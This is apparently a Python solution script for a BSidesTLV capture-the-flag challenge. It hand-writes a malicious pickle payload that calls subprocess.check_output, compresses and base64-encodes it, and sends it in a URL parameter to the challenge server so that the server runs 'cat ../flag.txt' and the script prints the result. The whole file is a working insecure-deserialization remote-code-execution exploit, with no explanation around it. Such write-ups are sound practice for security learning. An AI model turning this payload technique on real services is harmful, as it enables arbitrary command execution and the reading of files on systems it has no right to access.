import zlib
import requests
import base64

def create_command(cmd, args, flags):
    mould = """csubprocess
check_output
(((S'{0}'
S'{1}'
S'{2}'
ltR."""
    return base64.b64encode(zlib.compress(mould.format(cmd, args, flags), 9))

targeturl = 'http://challenges.bsidestlv.com:8088/statusMembers.html?data={0}&format=json'
r = requests.get(targeturl.format(create_command('cat', '../flag.txt', '-u')))
print ('\n'.join(r.text[1:-1].split('\\n')))
